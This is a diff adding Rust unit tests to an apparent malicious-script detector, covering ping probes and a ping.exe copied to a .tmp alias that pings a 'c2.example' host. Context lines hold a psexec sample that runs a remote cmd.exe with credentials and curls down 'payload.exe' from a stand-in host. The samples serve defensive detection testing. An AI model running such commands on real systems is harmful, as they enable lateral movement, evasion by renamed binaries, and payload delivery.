@@ -3654,6 +3654,62 @@ C:\Users\Public\nl.tmp malicious.example
     }
 
     #[test]
+    fn ping_emits_network_probe() {
+        let report = analyze(
+            br#"ping -n 1 8.8.8.8
+ping 127.0.0.1
+"#,
+            &AnalyzeConfig::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::NetworkProbe { probe_kind, target }
+                    if probe_kind == "icmp-ping" && target == "8.8.8.8"
+            )),
+            "ping target was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::NetworkProbe { probe_kind, target }
+                    if probe_kind == "icmp-ping" && target == "127.0.0.1"
+            )),
+            "loopback ping should not be surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn copied_ping_alias_emits_network_probe() {
+        let script = br#"copy C:\Windows\System32\ping.exe C:\Users\Public\pg.tmp
+C:\Users\Public\pg.tmp -n 1 c2.example
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\pg.tmp"#)
+            )),
+            "copied ping alias was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::NetworkProbe { probe_kind, target }
+                    if probe_kind == "icmp-ping" && target == "c2.example"
+            )),
+            "copied ping target was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn psexec_replays_remote_cmd_child() {
         let script = br#"psexec \\target.example -u admin -p pass cmd.exe /V:ON /c set U=https://psexec-wrapper.example/payload.exe&&curl -o payload.exe !U!"#;
         let report = analyze(script, &AnalyzeConfig::default());
